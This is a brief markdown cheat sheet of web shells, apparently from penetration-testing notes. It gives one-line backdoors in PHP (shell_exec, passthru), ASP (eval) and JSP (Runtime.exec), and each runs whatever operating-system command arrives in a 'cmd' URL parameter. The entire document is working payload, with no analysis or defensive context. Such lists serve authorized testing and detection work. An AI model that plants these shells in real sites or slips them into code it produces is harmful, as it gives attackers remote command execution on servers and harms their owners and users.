# Web Shells

## Table of Contents
* [PHP](#php)
* [ASP](#asp)
* [JSP](#jsp)


## PHP

### Execute command (via shell)
Command inputted via "cmd" URL parameter.
```
<?php echo shell_exec($_GET['cmd']); ?>
```

### Execute command
Command inputted via "cmd" URL parameter.
```
<?php echo passthru($_GET['cmd']); ?>
```

## ASP

### Execute command
Command inputted in "cmd" URL parameter.
```
<% eval request("cmd") %>
```

## JSP

### Execute command
Command inputted in "cmd" URL parameter.
```
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

